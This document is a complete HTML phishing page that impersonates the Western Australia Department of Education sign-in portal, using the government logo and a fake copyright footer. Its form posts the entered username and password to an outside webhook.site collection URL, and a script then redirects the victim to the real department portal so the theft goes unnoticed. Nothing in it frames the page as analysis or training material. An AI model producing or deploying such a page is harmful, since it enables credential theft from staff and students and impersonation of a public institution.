<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Department of Education | Sign In</title>
  <style>
    body {
      background-color: #e6f2ff;
      font-family: "Segoe UI", sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      background-color: white;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      width: 350px;
    }

    .logo {
      text-align: center;
      margin-bottom: 30px;
    }

    .logo img {
      width: 120px;
    }

    h2 {
      text-align: center;
      margin-bottom: 24px;
      font-size: 20px;
      color: #333;
    }

    label {
      font-weight: 600;
      display: block;
      margin-top: 12px;
      margin-bottom: 4px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    input[type="submit"] {
      width: 100%;
      padding: 12px;
      margin-top: 24px;
      background-color: #0078D7;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #005fa3;
    }

    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 12px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">
      <img src="https://www.education.wa.edu.au/o/waedu-theme/images/logos/wa-government.svg" alt="WA Government">
    </div>
    <h2>Department of Education | Sign In</h2>
    <form action="https://webhook.site/633fa077-b60a-4d30-99cb-f473e9943632" method="POST">
      <label for="username">Email or Username</label>
      <input type="text" id="username" name="username" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" required>

      <input type="submit" value="Sign In">
    </form>
    <div class="footer">Â© 2025 Western Australia Department of Education</div>
  </div>

  <script>
    document.querySelector("form").addEventListener("submit", function() {
      setTimeout(function() {
        window.location.href = "https://connect.det.wa.edu.au/";
      }, 1500);
    });
  </script>
</body>
</html>
